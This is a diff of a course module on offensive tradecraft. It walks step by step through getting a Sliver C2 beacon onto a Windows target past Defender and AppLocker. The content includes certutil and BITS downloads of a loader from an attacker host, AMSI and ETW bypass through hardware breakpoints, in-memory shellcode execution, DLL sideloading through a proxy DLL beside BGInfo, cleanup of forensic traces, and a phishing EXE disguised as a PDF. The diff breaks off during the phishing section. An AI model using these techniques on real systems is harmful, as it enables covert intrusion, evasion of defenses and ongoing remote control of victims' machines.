-Use `certutil.exe` to download the loader. Certutil is a Microsoft tool that ships with Windows, lives in `C:\Windows\System32\`, and is signed by Microsoft. AppLocker trusts it without question. Certutil can download a file from an HTTP URL and save it to disk:
-
-```cmd
-certutil.exe -urlcache -split -f http://192.168.10.10:8888/loader.exe C:\Windows\Temp\loader.exe
-```
-
-What the flags mean:
-- `-urlcache -split -f` tells certutil to fetch the file from the URL. The `-f` flag forces a fresh download even if the URL is already in the cache. The `-split` flag handles any file size.
-- The first argument after the flags is the URL. The second is where to save the file.
+`certutil.exe` is used for delivery. It is a Microsoft-signed binary in `C:\Windows\System32\` that AppLocker trusts unconditionally. Its `-urlcache` function can download files from HTTP URLs. This is a living-off-the-land technique: using a Windows-native signed binary for a task that would otherwise require dropping a third-party downloader. The download destination is `C:\Windows\Temp\`, which is in the AppLocker allow list and writable by standard users.
 
 You should see:
 
@@ -675,36 +668,34 @@ dir C:\Windows\Temp\loader.exe
 ```powershell
 Start-BitsTransfer -Source 'http://192.168.10.10:8888/loader.exe' -Destination 'C:\Windows\Temp\loader.exe'
 ```
-### 3.5 Run the Loader
+### 3.5 Execute the Loader
 
 ```cmd
 C:\Windows\Temp\loader.exe
 ```
 
-The CMD prompt returns immediately. No window appears, no output, no blinking cursor. That is correct and expected. The loader is compiled as a GUI application (`--app:gui`), so Windows launches it as a background process and does not wait for it to finish.
+The CMD prompt returns immediately. No window appears. This is expected and correct behavior because the binary is compiled as a GUI application (`--app:gui`). Windows detaches it from the terminal immediately rather than waiting for the process to exit.
 
-In the background it is:
-1. Installing hardware breakpoints on ETW and AMSI — no memory patching
-2. Connecting to `192.168.10.10:8888` and fetching `beacon_encoded.bin`
-3. XOR-decoding the Sliver beacon shellcode in memory
-4. Allocating RW memory, writing the decoded shellcode, flipping to RX
-5. Executing the shellcode via `EnumSystemLocalesA` callback — the beacon starts running
+What is happening in the background:
+1. Hardware breakpoints are installed on `AmsiScanBuffer` and `EtwEventWrite` via the CPU's DR0/DR1 debug registers. No DLL bytes are modified.
+2. The loader connects to `192.168.10.10:8888` and fetches `beacon_encoded.bin`.
+3. XOR decoding runs entirely in memory. The decoded shellcode exists only in RAM.
+4. `VirtualAlloc` allocates a `PAGE_READWRITE` region. Shellcode is written. `VirtualProtect` flips it to `PAGE_EXECUTE_READ`. No RWX page is ever created.
+5. `EnumSystemLocalesA` is called with the shellcode address as its callback. The Sliver implant begins executing inside this callback.
 
-If you used `--app:console` instead, the CMD window would freeze and sit there doing nothing for as long as the beacon is alive. That is a red flag for any user who launched it. `--app:gui` avoids this entirely.
+The beacon immediately starts making HTTPS check-ins to `192.168.10.10:443`.
 
-The beacon shellcode contains the complete Sliver implant. It immediately starts making HTTPS check-ins to `192.168.10.10:443`.
+### 3.6 Receive the Beacon Check-In
 
-### 3.6 Catch the Beacon in Sliver
-
-Back in your Sliver console on Kali, within 30 to 40 seconds you will see a line appear:
+In the Sliver console on Kali, within 30 to 40 seconds you will see the first check-in:
 
 ```
 [*] Beacon 0e66afcc COMPULSORY_DOORKNOB - 192.168.10.20:57584 (WORKSTATION01) - windows/amd64
 ```
 
-This means the beacon checked in. The name like `COMPULSORY_DOORKNOB` is randomly generated by Sliver for each implant.
+Sliver assigns a randomly generated name to each implant. The ID and name will be different in your environment.
 
-> **Important:** Do not run `sessions`. Beacons and sessions are different things in Sliver. A session is a permanent open connection. A beacon checks in on a schedule, sends results, and disconnects. If you type `sessions` you will see "No sessions" even when everything is working. The correct command is `beacons`.
+> **Do not run `sessions`**. Sessions and beacons are separate implant types in Sliver. A session maintains a persistent open connection and appears under `sessions`. A beacon uses periodic check-ins and appears only under `beacons`. Running `sessions` will show nothing even when your beacon is working correctly.
 
 List your beacons:
 
@@ -738,13 +729,7 @@ Run a command:
 sliver (COMPULSORY_DOORKNOB) > whoami
 ```
 
-You will not see the output immediately. Sliver queues the command and waits for the next check-in to deliver it. You will see:
-
-```
-[*] Tasked beacon COMPULSORY_DOORKNOB (whoami)
-```
-
-Wait up to 30 seconds. When the beacon checks in next, it runs the queued command and sends the result back:
+Commands in beacon mode are asynchronous. Sliver queues the task and the beacon picks it up on its next check-in. You will see a "Tasked" confirmation immediately, then the result arrives up to 30 seconds later:
 
 ```
 corp\vamsi
@@ -764,53 +749,52 @@ After the next check-in you will see something like:
 [*] C:\Users\vamsi
 ```
 
-The `Current Token ID` line is Sliver telling you which Windows user account the beacon process is running as. `CORP\vamsi` confirms the beacon is running in the context of the logged-in user. The path below it is the working directory.
-
-You now have a working Sliver beacon running as `CORP\vamsi` on `WORKSTATION01`, bypassing both Defender and AppLocker. Method 1 is complete.
+The `Current Token ID` shows the Windows security token the beacon process is running under. `CORP\vamsi` confirms the implant is operating in the context of the logged-in domain user. Method 1 is complete. You have an active beacon on the target past both Defender and AppLocker.
 
 ### 3.7 Troubleshooting
 
-**Defender deletes loader.exe before you can run it.**
+**Defender quarantines loader.exe before it runs.**
 
-This means Defender matched something in the file during the static scan. The most likely cause is that the XOR key you used is one Defender has seen before. Fix: change the `XOR_KEY` constant to a different value, re-run the XOR encoder, and recompile the loader. Changing the key changes the encrypted shellcode bytes and changes the loader binary, which gives it a different hash.
+The static scanner matched a signature. Most likely cause is the XOR key producing an encoded shellcode pattern Defender has already seen. Change `XOR_KEY` to a different value, re-run the encoder, recompile. The new binary has a different hash and different encoded payload bytes.
 
-**The loader runs but no beacon appears in Sliver after 30 to 40 seconds.**
+**Loader executes but no beacon appears after 30 to 40 seconds.**
 
-Check the HTTP server terminal on Kali (port 8888). Look at the access log output. Did a request come in for `beacon_encoded.bin`? If yes, the loader started and fetched the shellcode. The problem is with the Sliver listener. Check it:
+Check the staging server terminal. Did a GET request for `beacon_encoded.bin` arrive? If yes, the loader fetched the shellcode. The problem is the Sliver listener. Check:
 
 ```
 sliver > jobs
 ```
 
-If Job 1 is not listed, the HTTPS listener stopped. Start it again:
+If Job 1 is not listed, the HTTPS listener stopped. Restart it:
 
 ```
 sliver > https --lhost 192.168.10.10 --lport 443
 ```
 
-If the HTTP server shows no request came in at all, the loader crashed before reaching the fetch step. The most common cause is the hardware breakpoint setup failing. Check in Task Manager whether the process even started.
+If the staging server shows no request at all, the loader crashed before reaching the fetch step. The most common cause is the hardware breakpoint VEH registration failing. Verify in Task Manager that `loader.exe` appeared as a process at all.
 
-**Defender catches the loader while it is running.**
+**Defender kills the loader mid-execution.**
 
-This means a behavioural rule triggered during execution. Two things to try: change the XOR key and recompile (produces a different binary, may avoid the behavioural rule that matched), or move to Method 2 which runs the shellcode inside a signed Microsoft process and is harder for Defender to flag.
+A behavioral rule triggered at runtime. Try recompiling with a different XOR key (changes the binary structure), or move to Method 2, where the implant runs inside a Microsoft-signed process that Defender is more reluctant to flag.
 
-### 3.8 What You Leave Behind (OPSEC)
+### 3.8 OPSEC Assessment for Method 1
 
-After the session is running, these traces exist on the victim machine:
-- `loader.exe` in `C:\Windows\Temp\`. Delete it once the session is stable: `sliver (corp-beacon) > rm C:\Windows\Temp\loader.exe`
-- Certutil leaves a record in the Windows URL cache. Clean it up: run `certutil -urlcache -split -f http://192.168.10.10:8888/loader.exe delete` on the victim.
-- Windows Prefetch records that `LOADER.EXE` ran. This is visible to forensic investigators.
-- Network logs show a connection from `WORKSTATION01` to `192.168.10.10:8888` to fetch the beacon, and then regular HTTPS connections every 30 seconds to port 443.
+OPSEC (Operational Security) refers to limiting the forensic and network artifacts your activity leaves behind. After the beacon is stable, the following artifacts exist on the target:
 
-Anyone watching network traffic will see the regular 30-second HTTPS connections from the victim to your Kali IP. The jitter makes the timing slightly unpredictable but the pattern is still visible. In a real engagement you would route C2 traffic through a domain that looks legitimate, not directly to your own IP.
+- `loader.exe` on disk in `C:\Windows\Temp\`. Delete it via the beacon once it is stable.
+- Windows Prefetch file `LOADER.EXE-{hash}.pf` records that the binary executed. This is visible to incident responders during forensic analysis.
+- The Windows URL cache records certutil's download of `loader.exe`.
+- Network flow logs show an outbound HTTP connection from `WORKSTATION01` to `192.168.10.10:8888` (shellcode fetch), followed by periodic HTTPS connections to port 443 (C2 check-ins).
+
+The periodic HTTPS check-ins are the most persistent network indicator. Jitter makes the exact interval variable but the pattern of regular connections to a single IP is detectable by a network analyst. In a real engagement, C2 traffic would be routed through a domain fronting provider or a redirector that proxies traffic to the actual C2 infrastructure, making the destination IP non-attributable.
 
 ---
 
 ## Part 4: Method 2 - DLL Sideloading Chain
 
-In this method, you do not drop an executable and run it. Instead, you create a DLL file and place it next to a legitimate Microsoft program. When that Microsoft program starts, Windows automatically loads your DLL as part of its normal startup process. Your code runs inside the Microsoft program's process. Defender sees the Microsoft program running, not a random loader.
+Method 2 eliminates the unsigned executable from the picture entirely. Instead of running your own binary, you inject a malicious DLL into the startup sequence of a legitimate, Microsoft-signed process. The implant runs inside that trusted process. From Defender's perspective, a signed Microsoft binary started and loaded a DLL from its own directory. From AppLocker's perspective, there is no executable to evaluate because DLL enforcement is off by default.
 
-AppLocker does not have DLL rules enabled by default, so it never checks your DLL. And because your code runs inside a process that belongs to a signed Microsoft binary, Defender is much less likely to flag the activity.
+This technique is classified under MITRE ATT&CK as T1574.002 (Hijack Execution Flow: DLL Side-Loading). It is a standard initial access and persistence technique used by multiple APT groups.
 
 ### 4.1 Prerequisites: Sliver, Shellcode, and HTTP Server
 
@@ -909,53 +893,44 @@ This should return `200`. If it returns `404`, the file does not exist in `/tmp/
 
 ---
 
-### 4.2 What DLL Sideloading Is
+### 4.2 How DLL Sideloading Works
 
-Every Windows application depends on DLL files. DLL stands for Dynamic Link Library. A DLL is a file that contains code shared between multiple programs. When an application starts, Windows finds the DLLs that the application needs and loads them into memory.
+DLL stands for Dynamic Link Library. Every Windows application depends on DLL files that provide shared functionality. When a process starts, Windows resolves each DLL dependency by searching a defined set of locations in order. This is called the DLL search order.
 
-Windows searches for DLLs in a specific order:
+The critical point: **Windows checks the application's own directory first**, before looking in System32 or any system path. If a program in `C:\Windows\Temp\bginfo\` needs `version.dll`, Windows checks whether `C:\Windows\Temp\bginfo\version.dll` exists before looking in `C:\Windows\System32\`.
 
-1. The folder where the executable file is located
-2. The System32 folder (`C:\Windows\System32\`)
-3. The System folder (`C:\Windows\System\`)
-4. The Windows folder (`C:\Windows\`)
-5. The current working folder
-6. Folders listed in the PATH environment variable
+Sideloading exploits this. You:
+1. Identify a legitimate signed binary that loads a DLL by name (not absolute path), so the search order applies.
+2. Place your malicious DLL in that binary's directory using the exact DLL filename it expects.
+3. Launch the signed binary. It loads your DLL from its directory instead of the real system DLL.
+4. Your DLL's `DllMain` function executes automatically as part of the load process. That is where your shellcode runner lives.
 
-Step 1 is the important one. Windows looks in the application's own folder first, before it looks anywhere else. This means if a program in `C:\Program Files\SomeApp\` needs a file called `version.dll`, Windows checks whether `C:\Program Files\SomeApp\version.dll` exists. If it does, Windows loads that file. If it does not, Windows moves on to System32.
+The host process is signed and trusted, so Defender does not flag the process itself. AppLocker has no DLL rules in the default configuration, so your DLL is never evaluated.
 
-Sideloading takes advantage of this search order. You:
-1. Find a legitimate Microsoft program that loads a DLL by name without giving a full path
-2. Put your malicious DLL in the same folder as that program, using the exact same filename
-3. Run the legitimate program. It picks up your DLL from its own folder instead of the real system DLL.
-4. Your DLL's startup function (`DllMain`) runs automatically. That is where you put your shellcode runner.
+### 4.3 DLL Proxying: Maintaining Application Functionality
 
-The program that loads your DLL is signed and trusted, so Defender does not immediately treat it as suspicious. AppLocker has no DLL rules configured in the default setup, so AppLocker never checks your DLL file at all.
+If your malicious DLL does not export the same functions as the real DLL it replaces, the application will crash on startup when it tries to call a function that does not exist. A crash is an OPSEC failure. The user notices, an administrator investigates.
 
-### 4.2 DLL Proxying: Keeping the Application Working
+DLL proxying solves this. Your malicious DLL:
+1. Exports every function the real DLL exports, by name.
+2. Loads the real DLL from the same directory (renamed to `version_real.dll` to avoid a naming conflict).
+3. Forwards all incoming function calls through to the real DLL, so the application gets the correct return values and behaves normally.
+4. Runs the shellcode loader inside `DllMain` before forwarding control to the application.
 
-There is a problem with placing a malicious DLL next to a program. If the program needs to call functions from that DLL, and your malicious DLL does not have those functions, the program will crash. A crash is noisy. The user notices. An administrator might investigate.
+The application runs exactly as expected. The user sees nothing abnormal. The implant is running inside the memory space of a Microsoft-signed process.
 
-The solution is DLL proxying. Your malicious DLL:
-1. Exports all the same function names that the real DLL exports
-2. Loads the real DLL from the same folder (renamed to `version_real.dll` so it does not conflict)
-3. Passes all incoming function calls through to the real DLL so the application works normally
-4. Runs your shellcode inside `DllMain` before passing control to the application
+### 4.4 Choosing the Target Binary and DLL
 
-The application works exactly as expected. The user sees nothing unusual. Your shellcode is running inside the background thread of a signed Microsoft process.
+The target binary for sideloading must satisfy three conditions:
+- It must be Microsoft-signed so AppLocker and Defender treat the process as trusted.
+- It must load a DLL by relative name (not absolute path), so the search order vulnerability applies.
+- It must be placeable in `C:\Windows\Temp\` or another AppLocker-trusted path that standard users can write to.
 
-### 4.3 Choosing the Target Program and DLL
+For this lab the target is **BGInfo64.exe** from Microsoft Sysinternals.
 
-You need a signed Microsoft program that:
-- Is located in, or can be placed in, a path that AppLocker trusts
-- Loads a DLL by name only, not by full path, so the search order applies
-- Can be placed in a folder that a standard user can write to
+**BGInfo** is a Microsoft-distributed utility that renders system information (hostname, IP address, OS version) directly onto the Windows desktop wallpaper. IT administrators deploy it widely on servers and workstations. Security teams frequently whitelist it. It is signed by Microsoft.
 
-For this lab you will use **BGInfo64.exe** from Microsoft Sysinternals.
-
-**What BGInfo is:** A Microsoft tool that shows system information on the Windows desktop background. It is signed by Microsoft. IT administrators use it on servers to display the computer name, IP address, and operating system version on the desktop wallpaper. Security teams often whitelist it because it is a legitimate admin tool.
-
-**Why BGInfo works here:** When BGInfo64.exe starts, it loads `version.dll` from the same folder it is in. `version.dll` is the Windows Version API library. BGInfo uses it to read the Windows version number for display. You will place BGInfo64.exe in `C:\Windows\Temp\` together with your malicious `version.dll`. When BGInfo starts, it loads your DLL from that folder instead of the real one from System32.
+**Why BGInfo is suitable:** When BGInfo64.exe starts, it loads `version.dll` from the directory it runs from, before searching System32. `version.dll` is the Windows Version API library that BGInfo uses to read the OS version string. If you place BGInfo64.exe in `C:\Windows\Temp\bginfo\` alongside a malicious `version.dll`, BGInfo loads your DLL instead of the real one from System32. AppLocker does not evaluate the DLL. BGInfo is trusted.
 
 **Download BGInfo on Kali:**
 
@@ -979,45 +954,17 @@ dir C:\Windows\Temp\bginfo\
 
 You should see `Bginfo64.exe`, `Bginfo.exe`, and the EULA file.
 
-### 4.4 Finding What DLLs BGInfo Loads (Using Process Monitor)
+### 4.5 Identifying the Sideloading Opportunity with Process Monitor
 
-This step teaches you the process for finding sideloadable DLLs in any application. You need **Process Monitor** (also from Sysinternals) to watch what DLLs a process tries to load and WHERE it looks for them.
+Process Monitor is a Sysinternals tool that logs every file system, registry, and network operation a process performs. It is the standard method for discovering DLL sideloading opportunities in any application. The technique is: run the target binary while Process Monitor is capturing, then filter for `NAME NOT FOUND` results in the binary's own directory for DLL load attempts. Those are the sideloadable DLLs.
 
-Download Process Monitor on the victim:
+Process Monitor runs in `C:\Windows\Temp\` and is Microsoft-signed, so AppLocker permits it.
 
-```powershell
-Invoke-WebRequest -Uri "https://download.sysinternals.com/files/ProcessMonitor.zip" -OutFile "$env:TEMP\ProcessMonitor.zip"
-Expand-Archive -Path "$env:TEMP\ProcessMonitor.zip" -DestinationPath "C:\Windows\Temp\procmon\"
-```
+Filter configuration: set `Operation` = `Load Image` and `Process Name` = `Bginfo64.exe`. This filters the capture to only show image load events from BGInfo.
 
-AppLocker allows this because it is in `C:\Windows\Temp\` and the executables are Microsoft-signed.
+Run BGInfo with `/timer:0` to apply immediately. You will see BGInfo attempt to load `version.dll` from `C:\Windows\Temp\bginfo\` first, get `NAME NOT FOUND`, then fall through to `C:\Windows\System32\version.dll`. That failed lookup in the application's own directory is the sideloading opportunity.
 
-Run Process Monitor (you will see a UAC prompt - this requires admin, so accept or enter admin credentials):
-
-```
-C:\Windows\Temp\procmon\Procmon64.exe
-```
-
-In Process Monitor, set a filter to only show DLL-related events:
-
-1. Go to **Filter** menu -> **Filter...**
-2. Add a filter: `Operation` `is` `Load Image` -> then click **Add**
-3. Add another: `Process Name` `is` `Bginfo64.exe` -> **Add**
-4. Click **OK**
-
-Now run BGInfo64:
-
-```
-C:\Windows\Temp\bginfo\Bginfo64.exe /timer:0
-```
-
-`/timer:0` tells BGInfo to apply immediately without waiting.
-
-Watch Process Monitor. You will see all the DLLs Bginfo64.exe loads. Look for DLLs that show `PATH NOT FOUND` or `NAME NOT FOUND` status in the Bginfo64 directory before finding them in System32. These are your sideloading candidates.
-
-You will see BGInfo trying to load `version.dll` from `C:\Windows\Temp\bginfo\` first, failing to find it, then loading it from `C:\Windows\System32\`. This confirms the sideloading opportunity.
-
-### 4.5 Write the Proxy DLL in Nim
+### 4.6 Write the Proxy DLL in Nim
 
 On Kali, create the DLL source file:
 
@@ -1025,10 +972,10 @@ On Kali, create the DLL source file:
 nano /tmp/version_proxy.nim
 ```
 
-This DLL does three things:
-1. In `DllMain`, when attached to a process, spawn a thread that runs your shellcode
-2. Load the real `version.dll` (which you will rename to `version_real.dll`) 
-3. Forward all `version.dll` function calls to the real DLL so BGInfo keeps working
+The DLL does three things in sequence:
+1. On `DLL_PROCESS_ATTACH` in `DllMain`, spawn a thread that runs the shellcode loader.
+2. Load `version_real.dll` (the real `version.dll` you will rename) so BGInfo's calls can be forwarded.
+3. Export all functions from the real `version.dll`, forwarding each call to the real implementation, so BGInfo functions correctly.
 
 ```nim
 import winim/lean
@@ -1291,7 +1238,7 @@ proc DllMain*(
 
 Save the file.
 
-### 4.6 Compile the Proxy DLL
+### 4.7 Compile the Proxy DLL
 
 ```bash
 nim c \
@@ -1306,30 +1253,30 @@ nim c \
   /tmp/version_proxy.nim
 ```
 
-Key difference from the EXE compile command:
-- `--app:lib` tells Nim to compile as a DLL (shared library) instead of an executable
-- `--nomain` prevents Nim from generating a `main` entry point (DLLs use `DllMain`, not `main`)
-- `-o:/tmp/version.dll` output filename is `version.dll` (exactly what BGInfo will look for)
+Flags specific to DLL compilation:
+- `--app:lib` outputs a shared library (DLL) instead of an executable.
+- `--nomain` suppresses Nim's autogenerated `main` entry point. DLLs use `DllMain`, not `main`.
+- `-o:/tmp/version.dll` names the output exactly what BGInfo will search for.
 
-Check the output:
+Verify the output:
 
 ```bash
 ls -la /tmp/version.dll
 file /tmp/version.dll
 ```
 
-The file command should show: `PE32+ executable (DLL) (GUI) x86-64, for MS Windows`.
+Expected output: `PE32+ executable (DLL) (GUI) x86-64, for MS Windows`.
 
-### 4.7 Set Up the Sideloading Chain on the Victim
+### 4.8 Set Up the Sideloading Chain on the Target
 
-You need three files in the same directory:
-1. `Bginfo64.exe` - the signed Microsoft binary (already downloaded)
-2. `version.dll` - your malicious proxy DLL (compiled above)
-3. `version_real.dll` - the real System32 version.dll (renamed so your proxy can forward calls to it)
+The sideloading chain requires three files in the same directory:
+1. `Bginfo64.exe` - the legitimate Microsoft-signed binary that will load your DLL.
+2. `version.dll` - your malicious proxy DLL.
+3. `version_real.dll` - the real `version.dll` copied from System32 and renamed, so your proxy can forward calls to the real implementation.
 
-On the Kali HTTP server (still running on port 8888 from `/tmp/`), your `version.dll` is at `http://192.168.10.10:8888/version.dll`.
+Your `version.dll` is on Kali's staging server at `http://192.168.10.10:8888/version.dll`.
 
-On the victim, as `CORP\vamsi`, run these commands:
+On the target, as `CORP\vamsi`:
 
 ```cmd
 :: Download your malicious version.dll to the bginfo directory
@@ -1353,84 +1300,62 @@ version_real.dll  (real version.dll, renamed)
 Eula.txt
 ```
 
-### 4.8 Trigger the Sideload
+### 4.9 Trigger the Sideload
 
-Make sure your Sliver HTTPS listener is still running on Kali (check with `sliver > jobs`). If it stopped, restart it:
+Verify the Sliver HTTPS listener is still running (`sliver > jobs`). If it stopped, restart it.
 
-```
-sliver > https --lhost 192.168.10.10 --lport 443
-```
-
-On the victim, run BGInfo:
+On the target, launch BGInfo:
 
 ```cmd
 C:\Windows\Temp\bginfo\Bginfo64.exe /timer:0 /silent
 ```
 
-`/silent` suppresses the BGInfo GUI. BGInfo runs, loads your `version.dll`, your DLL's `DllMain` fires, a thread is created, the shellcode runner fetches the encoded Sliver beacon from Kali, decodes it, and runs it directly. The beacon starts checking in on port 443.
+`/silent` suppresses the BGInfo GUI window. What happens in order: BGInfo starts, Windows resolves `version.dll` and finds it in the application directory, your DLL's `DllMain` fires on `DLL_PROCESS_ATTACH`, a new thread is spawned, the shellcode runner inside that thread fetches the encoded beacon from Kali, decodes it in memory, and executes it via `EnumSystemLocalesA`. The Sliver beacon starts checking in on port 443.
 
-After about 5 to 10 seconds, check Sliver on Kali:
+In Sliver, a new beacon entry appears for `WORKSTATION01`. Run `ps` through the beacon and wait for the next check-in. The process list will include `Bginfo64.exe`. That is the process your implant is running inside.
 
-```
-sliver > beacons
-```
+### 4.10 Detection Characteristics vs Method 1
 
-You should see a new beacon appear. The hostname shows `WORKSTATION01` and the username shows `CORP\vamsi`. Open it:
+**What Defender observes:**
+- `Bginfo64.exe` (Microsoft-signed) starts.
+- It loads `version.dll` from its working directory.
+- The DLL spawns a thread.
+- That thread makes an outbound HTTP connection.
+- The thread allocates memory, writes to it, changes protection, and executes.
 
-```
-sliver > use <beacon-id>
-```
+**Why this is harder to detect than Method 1:**
+- The host process is a trusted, signed Microsoft binary. Defender's trust model is less aggressive toward processes with a known-good parent signature.
+- AppLocker has no DLL rules enabled by default. The malicious DLL is never evaluated.
+- Outbound network connections from a trusted process are less likely to trigger anomaly alerts than connections from an unknown binary.
+- ETW telemetry from the process is suppressed via hardware breakpoints.
 
-Then queue a command to confirm the process name:
+**Remaining detection vectors:**
+- An unsigned DLL loaded from a non-standard path into a known binary. Sysmon Event ID 7 (ImageLoaded) will log this. EDR products with image load analysis will flag it.
+- The HTTP connection from `Bginfo64.exe` to `192.168.10.10:8888` is anomalous for a desktop customization tool. Network behavior analysis can catch this.
+- A new hash for `version.dll` in a non-system path will be submitted to cloud intelligence and may generate a detection within minutes.
 
-```
-sliver (BEACON_NAME) > ps
-```
+### 4.11 OPSEC Assessment for Method 2
 
-Wait for the next check-in. In the output, you will see `Bginfo64.exe` listed. That is the process your beacon is running inside.
+Artifacts on the target after execution:
+- `version.dll` and `version_real.dll` on disk in `C:\Windows\Temp\bginfo\`.
+- Prefetch entry `BGINFO64.EXE-{hash}.pf`.
+- Sysmon Event ID 7: `version.dll` loaded from a non-standard path into `Bginfo64.exe`.
+- Network flow logs: HTTP from `Bginfo64.exe` to `192.168.10.10:8888`, then HTTPS check-ins to port 443.
 
-### 4.9 Why This Is Harder to Detect Than Method 1
-
-**What Defender sees:**
-- A signed Microsoft binary (`Bginfo64.exe`) starts running
-- It loads `version.dll` from its own directory
-- The DLL fires a thread
-- That thread makes an outbound HTTP connection
-- Then it allocates memory and runs code
-
-**Where Defender struggles:**
-- The parent process is signed and trusted. Defender does not flag the process itself.
-- The DLL is not signed, but AppLocker DLL rules are off, so AppLocker is silent.
-- The HTTP connection comes FROM a trusted signed process, which is less suspicious than an unknown exe making a connection.
-- ETW is patched so memory operation telemetry is suppressed.
-
-**What still makes noise:**
-- An unsigned DLL loaded from a non-standard path. Defender's cloud intelligence may flag this if it is novel.
-- The outbound HTTP connection from bginfo64.exe to `192.168.10.10:8888` to fetch the beacon. This is unusual network behavior for a desktop customization tool.
-- If Defender has file-hash-based blocking on your specific `version.dll`, it will catch it. Recompile with different constants to change the hash.
-
-### 4.10 OPSEC Note for Method 2
-
-What you leave behind:
-- `version.dll` and `version_real.dll` in `C:\Windows\Temp\bginfo\`
-- An entry in Prefetch: `BGINFO64.EXE`
-- Sysmon event 7 (ImageLoaded): `version.dll` loaded from a non-standard path into `Bginfo64.exe`
-- Network logs: HTTP request from `Bginfo64.exe` to `192.168.10.10:8888` (fetching beacon) and HTTPS to `:443` (C2 check-ins)
-
-To clean up the DLL files after the beacon is stable:
+Clean up the DLL files once the beacon is stable:
 
 ```
 sliver (BEACON_NAME) > rm C:\Windows\Temp\bginfo\version.dll
 sliver (BEACON_NAME) > rm C:\Windows\Temp\bginfo\version_real.dll
 ```
 
-Deleting the files does not kill the beacon. The shellcode is already running in memory inside Bginfo64.exe. The DLLs only needed to exist long enough to be loaded.
+Deleting the DLL files does not terminate the beacon. The shellcode is already mapped into `Bginfo64.exe`'s memory. The DLLs are only required for the initial load.
 
 ---
 
 ## Part 5: Verify and Interact With Your Beacon
 
-Whether you used Method 1 or Method 2, your Sliver beacon is now live. Here is how to work with it.
+Once you have a beacon from any method, the interaction model is identical. This section covers the standard beacon commands you will use throughout the course.
 
 ### 5.1 List Beacons and Connect
 
@@ -1454,7 +1379,7 @@ Replace `0e66afcc` with your actual beacon ID.
 
 ### 5.2 Basic Beacon Commands
 
-Beacons are asynchronous. When you type a command, Sliver queues it and delivers it on the next check-in (up to 30 seconds later). You type the command, see a "Tasked" message, then wait. When the beacon checks in, it runs the command and returns the result.
+Beacon communication is asynchronous. Every command you send is queued server-side. The beacon picks up the queue on its next check-in (up to 30 seconds), executes the tasks, and returns results on the following check-in. You type a command, receive a "Tasked" acknowledgement, then wait for the next check-in interval.
 
 Run these to confirm everything is working:
 
@@ -1498,69 +1423,60 @@ sliver (BEACON_NAME) > ls
 ```
 Wait. Lists files in the current directory.
 
-### 5.3 Run a Shell Command
+### 5.3 Execute Commands
 
 ```
 sliver (BEACON_NAME) > shell
 ```
 
-This drops you into an interactive `cmd.exe` on the victim. Note: in beacon mode, the shell waits until the next check-in to open. Type `exit` to return to Sliver.
+Opens an interactive `cmd.exe` session on the target. In beacon mode, the shell takes effect on the next check-in. Type `exit` to return to the Sliver prompt.
 
-Or run a single command without a full shell:
+For single commands, `execute -o` is faster than opening a full shell:
 
 ```
 sliver (BEACON_NAME) > execute -o whoami /all
 ```
 
-`-o` captures the output and returns it on the next check-in. `whoami /all` shows your full token including privileges. This is important for module 07 (privilege escalation).
+`-o` captures and returns the command output on the next check-in. `whoami /all` returns your full Windows token including group memberships and privileges. This is your starting point for privilege escalation analysis in module 07.
 
-### 5.4 Understand Beacon vs Session Mode
+### 5.4 Beacon Mode vs Session Mode
 
-Sliver has two implant types:
+**Beacon mode** is what you are using. The implant operates on a check-in schedule. Between check-ins there is no network connection. Commands are queued and delivered asynchronously. Network traffic appears as short-lived periodic HTTPS connections, which is consistent with normal application telemetry and background syncing. This is the operationally correct mode for any engagement where network monitoring is present.
 
-**Beacon mode (what you have now):** The implant checks in on a schedule (every 30 to 40 seconds in this setup). Between check-ins, there is no active connection. Commands are queued and run on the next check-in. This is harder to detect on the network because the connection pattern looks like normal periodic web traffic. For real engagements, beacon mode is what you want.
+**Session mode** maintains a persistent TCP connection between the implant and C2. Commands return results immediately with no delay. This is convenient for interactive work, but the permanent open connection is an obvious indicator in network flow analysis and `netstat` output on the target. Session mode is not appropriate for operational use.
 
-**Session mode:** The implant keeps a permanent open connection to the C2 server. Commands run and return results immediately with no delay. This is convenient for fast interactive work, but the permanent open connection is visible to anyone monitoring the network. You would not use session mode in a real engagement.
-
-You are using beacon mode throughout this course. The 30-second wait between commands is intentional. On a real engagement you would lower the check-in interval while active and raise it while idle to reduce noise.
+The 30-second check-in interval is a lab-friendly setting. In a real engagement, the sleep interval would be much longer during idle periods (hours) and shortened only when actively tasking the beacon, to minimize network indicators.
 
 ---
 
 ---
 
-## Part 6: Method 3 - The Fake PDF (EXE Disguised as a Document)
+## Part 6: Method 3 - Masqueraded EXE (Phishing-Based Initial Access)
 
-This method combines social engineering with your Nim loader. The file IS your loader, but it looks, feels, and behaves like a PDF to the user. When they double-click it, a real PDF opens on screen. In the background, your shellcode runs and the beacon fires.
+Method 3 is a phishing-based initial access technique. The payload is a Nim loader compiled to look and behave like a PDF document. When the target user executes it, a real PDF opens immediately, satisfying their expectation and removing suspicion. The implant runs in the background of the same process with no visible window.
 
-This is the technique used in CRTO with Cobalt Strike. You are doing the same thing with Nim and Sliver.
-
-### 6.1 How It Works
-
-The attack chain:
+### 6.1 Attack Chain
 
 ```
-1. User receives "Invoice_June2026.pdf" (actually an .exe with a PDF icon)
-2. User double-clicks it
-3. The Nim loader starts running
-4. First thing it does: extract an embedded real PDF from inside itself
-   and save it to a temp folder
-5. It opens that PDF with the default PDF reader (Adobe, Edge, whatever)
-6. User sees a real PDF document open - they think everything is normal
-7. In the background (same process), the loader installs hardware
-   breakpoints on ETW/AMSI, fetches the Sliver beacon shellcode, decodes
-   it, and runs it via callback execution
-8. Beacon fires. User is reading the PDF. They have no idea.
+1. Target receives "Invoice_June2026.pdf" (an .exe with a PDF icon and extension trick)
+2. Target double-clicks it
+3. The Nim loader executes
+4. First action: fetch the decoy PDF from Kali and open it via ShellExecute
+5. Target sees a real document open in their PDF reader
+6. In the background: hardware breakpoints set on ETW/AMSI, shellcode fetched,
+   decoded in memory, executed via EnumSystemLocalesA callback
+7. Beacon fires. Target is reading the document.
 ```
 
-The key insight: the user never sees a command prompt. They never see anything suspicious. They see a PDF open. That is it.
+The decoy document opens within 1 second of execution. The target sees exactly what they expected. No console window appears. No error. From the target's perspective, they opened a PDF.
 
-### 6.2 Why This Works Against Defender
+### 6.2 Why This Evades Defender
 
-- The binary has a unique hash (custom Nim code)
-- The PDF icon makes it visually indistinguishable from a real PDF in Explorer
-- Windows hides file extensions by default, so `Invoice_June2026.pdf.exe` shows as `Invoice_June2026.pdf`
-- Opening a real PDF legitimizes the process: the user sees exactly what they expected
-- The shellcode work happens after the PDF opens, so even if the user watches Task Manager, they see their PDF reader start (normal behavior)
+- Custom Nim code produces a unique hash not in any database.
